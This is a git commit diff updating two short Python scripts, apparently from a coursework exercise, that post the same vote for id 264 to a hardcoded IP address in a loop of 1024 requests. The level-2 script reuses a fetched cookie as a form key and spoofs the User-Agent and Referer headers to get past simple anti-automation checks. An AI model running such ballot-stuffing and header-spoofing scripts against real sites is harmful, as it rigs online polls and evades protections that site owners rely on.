0455081fde27304dedf36ef68b66f5474b94ddbb
vilyanare <acolytefowar@gmail.com>
2018-01-20 20:16:41 -0800

    Updated all scripts

--- 0-hodor.py
+++ 0-hodor.py
@@ -1,3 +1,4 @@
+import requests
 payload = {'id' : '264', 'holdthedoor' : 'Submit'}
 for i in range(1024):
     r = requests.post('http://158.69.76.135/level0.php', data=payload)
--- 2-hodor.py
+++ 2-hodor.py
@@ -1,13 +1,14 @@
 import requests
-r = requests.get('http://158.69.76.135/level1.php')
+head = {'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)', 'Referer' : 'http://158.69.76.135/level2.php'}
+r = requests.get('http://158.69.76.135/level2.php')
 c = r.cookies
 for key, value in c.items():
     cookie = value
 
 newcook = {'HoldTheDoor' : cookie}
 payload = {'id' : '264', 'holdthedoor' : 'Submit', 'key' : '{}'.format(cookie)}
-for i in range(4096):
-    r = requests.post('http://158.69.76.135/level1.php', data=payload, cookies=newcook)
+for i in range(1024):
+    r = requests.post('http://158.69.76.135/level2.php', data=payload, cookies=newcook, headers=head)
     c = r.cookies
     print(i + 1)
     for key, value in c.items():
